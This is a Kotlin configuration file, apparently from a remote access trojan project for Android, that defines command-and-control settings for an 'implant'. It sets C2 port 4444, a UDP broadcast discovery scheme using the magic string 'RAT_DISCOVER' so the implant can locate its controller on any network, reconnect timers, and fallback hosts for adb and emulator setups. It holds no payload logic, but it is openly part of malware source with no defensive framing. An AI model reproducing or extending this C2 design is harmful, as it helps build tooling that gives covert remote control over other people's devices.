package com.example.rat

object C2Config {
    const val PORT = 4444

    // UDP broadcast discovery: implant asks "where is the C2?" on the local
    // network and the server answers with its own current IP. Nothing is
    // hardcoded to a specific Wi-Fi, so switching networks needs no rebuild.
    const val DISCOVERY_PORT = 4445
    const val DISCOVERY_MAGIC = "RAT_DISCOVER"
    const val DISCOVERY_TIMEOUT_MS = 800
    const val DISCOVERY_BURST = 3

    const val CONNECT_TIMEOUT_LOCAL_MS = 800
    const val CONNECT_TIMEOUT_NETWORK_MS = 4000
    const val RECONNECT_MS = 5000L
    const val SESSION_GRACE_MS = 1000L

    // Fixed fallbacks that never depend on the laptop's physical IP.
    val staticHosts = listOf(
        "127.0.0.1",       // adb reverse tcp:4444 tcp:4444
        "172.27.112.1",    // vEthernet (BluestacksNxt) gateway
        "10.0.2.2"         // QEMU/AOSP host alias
    )
}
